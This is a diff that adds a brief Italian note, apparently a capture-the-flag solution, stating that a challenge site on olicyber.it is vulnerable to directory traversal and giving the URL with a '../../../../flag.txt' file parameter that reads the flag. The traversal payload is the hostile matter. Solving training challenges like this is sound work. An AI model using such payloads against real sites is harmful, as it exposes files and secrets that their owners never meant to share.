@@ -1,0 +1,3 @@
+il sito è vulnerabile al directory traversal
+
+http://find-me.challs.olicyber.it/menu?file=../../../../flag.txt
